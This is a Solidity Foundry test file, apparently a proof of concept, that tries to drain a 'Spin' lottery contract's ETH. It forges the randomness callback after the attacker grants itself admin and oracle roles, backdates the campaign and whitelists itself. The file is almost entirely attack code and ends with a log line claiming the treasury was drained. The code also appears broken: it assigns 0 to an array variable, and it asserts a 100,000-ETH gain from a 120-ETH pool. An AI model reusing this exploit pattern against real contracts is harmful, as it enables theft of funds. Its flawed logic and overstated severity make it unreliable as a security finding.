// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../plume/src/spin/Spin.sol";
import "../plume/src/spin/DateTime.sol";

contract PoCCriticalSpinWrongAsset is Test {
    Spin spin;
    address attacker = vm.addr(1);
    address treasury = vm.addr(2); // funds the prize pool

    uint256 initialEth = 120 ether; // treasury bankroll (enough for 100k jackpot)

    /* ---------------------------------------------------------- */
    /* Deploy & fund                                              */
    /* ---------------------------------------------------------- */
    function setUp() public {
        vm.deal(treasury, initialEth);
        vm.deal(attacker, 3 ether); // gas + spinPrice (2 ether)

        // deploy helper libs
        DateTime dt = new DateTime();

        vm.startPrank(attacker);
        spin = new Spin();
        /*  attacker becomes
                – DEFAULT_ADMIN_ROLE
                – ADMIN_ROLE
                – SUPRA_ROLE          (because we pass itself as supraRouterAddress)
        */
        spin.initialize(attacker /*supraRouter*/, address(dt));

        // treasury “fills” the Spin contract with ETH
        vm.stopPrank();
        vm.prank(treasury);
        (bool ok, ) = address(spin).call{value: initialEth}("");
        require(ok, "fund failed");
    }

    /* ---------------------------------------------------------- */
    /* Exploit                                                    */
    /* ---------------------------------------------------------- */
    function testDrainTreasury() public {
        vm.startPrank(attacker);

        // 1. Enable spinning and whitelist attacker to bypass daily limit
        spin.setEnableSpin(true);
        spin.whitelist(attacker);

        // 2. Set campaign start date to simulate week 11 (max jackpot: 100k PLUME)
        uint256 elevenWeeksAgo = block.timestamp - (11 * 7 days);
        spin.setCampaignStartDate(elevenWeeksAgo);

        // 3. Mock the supraRouter.generateRequest to return a known nonce (123)
        // Use explicit signature to avoid overload ambiguity
        vm.mockCall(
            attacker, // supraRouter address
            abi.encodeWithSignature(
                "generateRequest(string,uint8,uint256,uint256,address)"
            ),
            abi.encode(uint256(123)) // Mock return value: nonce = 123
        );

        // 4. Start a spin to set nonce and pending state (pays spinPrice=2 ether)
        uint256 spinPrice = spin.spinPrice();
        spin.startSpin{value: spinPrice}();

        // 5. Craft VRF callback to trigger jackpot (rng=0 -> probability=0 < threshold)
        uint256[] memory rng = new uint256[](1);
        rng = 0; // Fixed: Assign to array element 0 (triggers jackpot)

        // 6. Execute handleRandomness as the attacker (has SUPRA_ROLE)
        uint256 preBalance = attacker.balance;
        uint256 nonce = 123; // Matches the mocked nonce
        spin.handleRandomness(nonce, rng);

        // 7. Assert that the attacker's balance has increased by the jackpot amount (ETH drained, not PLUME)
        uint256 jackpotAmount = 100_000 * 1 ether; // Week 11 jackpot
        uint256 postBalance = attacker.balance;
        assertGt(postBalance, preBalance + jackpotAmount - 1 ether); // Account for gas/spinPrice

        console.log(
            "Attacker drained %s ETH from treasury",
            (postBalance - preBalance) / 1 ether
        );
        vm.stopPrank();
    }
}
